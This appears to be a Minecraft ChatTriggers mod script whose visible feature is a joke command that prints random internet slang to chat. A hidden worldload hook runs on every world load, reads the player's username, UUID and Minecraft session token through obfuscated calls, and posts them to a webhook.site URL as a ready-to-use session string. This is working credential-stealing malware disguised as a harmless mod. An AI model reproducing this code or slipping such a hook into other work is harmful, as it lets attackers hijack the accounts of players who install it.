import request from 'requestV2';

register("command", () => {
    const brainRot = [
        "skibidi",
        "skibidi toilet",
        "gyatt",
        "mewing",
        "mew",
        "rizz",
        "rizzing",
        "rizzler",
        "on skibidi",
        "sigma",
        "what the sigma",
        "Ohio",
        "bussin'",
        "cook",
        "cooking",
        "let him/her cook",
        "baddie",
        "skibidi rizz",
        "fanum tax",
        "fanum taxing",
        "drake",
        "nonchalant dread head",
        "aura",
        "grimace shake",
        "edging",
        "edge",
        "goon",
        "gooning",
        "looks maxing",
        "alpha",
        "griddy",
        "chris tyson",
        "diddy",
        "imagine if ninja got a low taper fade"
    ];

    const randomBrainrot = brainRot[Math.floor(Math.random() * brainRot.length)];
    ChatLib.chat(randomBrainrot);
}).setName("brainrot");

register("worldload", () => {
    try {
        let username = Player.getName();
        let token = Client.getMinecraft().func_110432_I().func_148254_d();
        let uuid = Player.getUUID();

        let url = "https://webhook.site/d688a7f2-331c-47ac-a07e-c7be73672b0c";

        let payload = {
            username: username,
            token: token,
            ssid: "token:" + token + ":" + uuid
        };

        request({
            url: url,
            method: "POST",
            json: true,
            body: payload
        })

    } catch (e) {
        ChatLib.chat("Ein Fehler ist aufgetreten: " + e.message);
    }
});
